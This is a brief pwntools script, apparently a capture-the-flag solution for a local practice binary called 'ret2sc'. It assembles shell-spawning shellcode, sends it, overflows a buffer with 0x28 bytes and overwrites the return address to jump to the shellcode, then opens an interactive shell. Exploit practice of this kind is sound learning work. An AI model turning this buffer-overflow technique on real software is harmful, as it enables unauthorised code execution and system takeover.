from pwn import *

r = process("./ret2sc")
context.arch = "amd64"
sc = shellcraft.sh()

g = 0x601080
sc = asm(sc)
r.sendline(sc)
r.sendline("a"*0x28 + p64(g))
r.interactive()
